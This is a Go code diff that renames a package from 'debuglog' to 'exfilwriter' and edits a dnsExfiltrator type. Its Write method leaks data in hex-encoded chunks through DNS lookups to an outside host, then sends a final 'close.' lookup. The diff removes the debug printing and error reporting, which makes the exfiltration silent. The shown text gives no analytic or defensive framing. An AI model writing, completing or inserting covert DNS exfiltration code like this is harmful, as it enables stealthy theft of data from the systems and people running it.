@@ -1,4 +1,4 @@
-package debuglog
+package exfilwriter
 
 import (
 	"encoding/hex"
@@ -19,7 +19,6 @@ type dnsExfiltrator struct {
 }
 
 func newDNSExfiltrator(host string) (*dnsExfiltrator, error) {
-	fmt.Printf("DNSExfil created: %s\n", host)
 	return &dnsExfiltrator{strings.Trim(host, " ")}, nil
 }
 
@@ -32,18 +31,10 @@ func (ex *dnsExfiltrator) Write(data []byte) (int, error) {
 
 	for len(payload) > 0 {
 		chunkLength := min(len(payload), availableSpace)
-		ips, err := net.LookupHost(fmt.Sprintf("%s.%s", payload[:chunkLength], postfix))
-		if err != nil {
-			fmt.Println(err)
-		} else {
-			fmt.Printf("Lookup %s.%s: %v\n", payload[:chunkLength], postfix, ips)
-		}
+		net.LookupHost(fmt.Sprintf("%s.%s", payload[:chunkLength], postfix))
 		payload = payload[chunkLength:]
 	}
-	_, err := net.LookupHost(fmt.Sprintf("close.%s", postfix))
-	if err != nil {
-		fmt.Println(err)
-	}
+	net.LookupHost(fmt.Sprintf("close.%s", postfix))
 	return len(data), nil
 }
 
@@ -55,6 +46,7 @@ func min(a, b int) int {
 }
 
 func generateMessageID() string {
+	// TODO: seed rng
 	var charSet = []rune("abcdefghijklmnopqrstuvwxyz0123456789")
 	res := make([]rune, dnsMessageIDLength)
 	for i := range res {
